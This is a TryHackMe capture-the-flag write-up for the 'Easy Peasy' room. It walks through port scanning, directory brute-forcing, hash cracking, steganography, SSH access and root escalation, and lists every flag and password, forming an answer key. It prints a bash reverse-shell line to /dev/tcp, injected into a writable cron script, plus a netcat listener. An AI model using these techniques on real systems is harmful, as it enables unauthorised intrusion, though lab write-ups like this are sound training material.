# TryHackMe — Easy Peasy Write-up

 **Overview**

- Room: Easy Peasy  
- Difficulty: Easy  
- Tags: Enumeration, Web Exploitation, Steganography, Privilege Escalation  

---

##  Enumeration with Nmap

Scanning the target machine:

```bash
sudo nmap -sC -sV -Pn -p- {target_IP}
```

Result:  
- 80/tcp → nginx 1.16.1  
- 6498/tcp → ssh  
- 65524/tcp → apache  

### Answers
1. How many ports are open? → **3**  
2. Version of Nginx? → **1.16.1**  
3. Service on the highest port? → **Apache**

---

##  Exploiting the Machine

### Task 1 – Flag 1
Using **GoBuster**:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://{IP}:80/
```

Found directory `/hidden` → `/whatever`.  
In the page source code we discovered a hidden hash.  
Decoded it using **CyberChef** → `From Base62`.  

 Flag 1 → **flag{f1rs7_fl4g}**

---

### Task 2 – Flag 2
Open:

```
http://{IP}:65524/robots.txt
```

Inside we find a strange User-Agent. Decoded it on md5hashing.net → got the flag.  

 Flag 2 → **flag{1m_s3c0nd_fl4g}**

---

### Task 3 – Flag 3
Check page source:

```
http://{IP}:65524
```

A hash was found → decoded with Base62.  

 Flag 3 → **flag{9fdafbd64c47471a8f54cd3fc64cd312}**  
Hidden path: `/n0th1ng3ls3m4tt3r`

---

### Task 4 – Hash Cracking
Save the hash into `password.txt`.  
Crack it using **John the Ripper** with the custom wordlist `easypeasy.txt`:

```bash
john --format=gost --wordlist=easypeasy.txt password.txt
```

Password: **mypasswordforthatjob**

---

### Task 5 & 6 – Steganography
In the web directory we found **binarycodepixarbay.jpg**.  
Check it with **stegseek**:

```bash
stegseek binarycodepixarbay.jpg easypeasy.txt
```

Result: extracted `secrettext.txt` with username and password.  

- Username: **boring**  
- Password (decoded from binary): **iconvertedmypasswordtobinary**

---

### Task 7 – User Flag
Connect via SSH:

```bash
ssh boring@{IP} -p 6498
```

Enter the password → access granted.  
Inside the home directory we find `user.txt`.  
The flag was encoded in ROT13 → decoded with CyberChef.  

 User Flag → **flag{n0wits33msn0rm4l}**

---

## 🚀 Privilege Escalation

Upload and run **linpeas.sh**.  
Found script `.mysecretcronjob.sh`. It had only comments, so we injected a reverse shell from [revshells.com](https://www.revshells.com/).

Example payload:

```bash
bash -i >& /dev/tcp/{Your_IP}/4242 0>&1
```

Start listener:

```bash
nc -lvnp 4242
```

When the connection popped, escalate privileges:

Now we are root.  
In the root directory we find `.root.txt`.  

 Root Flag → **flag{R00t_Acc3ss_C0mpl3t3}**

---

##  Summary of Flags

1. flag{f1rs7_fl4g}  
2. flag{1m_s3c0nd_fl4g}  
3. flag{9fdafbd64c47471a8f54cd3fc64cd312}  
4. Password cracked → mypasswordforthatjob  
5. stegseek → secrettext.txt (user: boring, pass: iconvertedmypasswordtobinary)  
6. User flag → flag{n0wits33msn0rm4l}  
7. Root flag → flag{R00t_Acc3ss_C0mpl3t3}

---


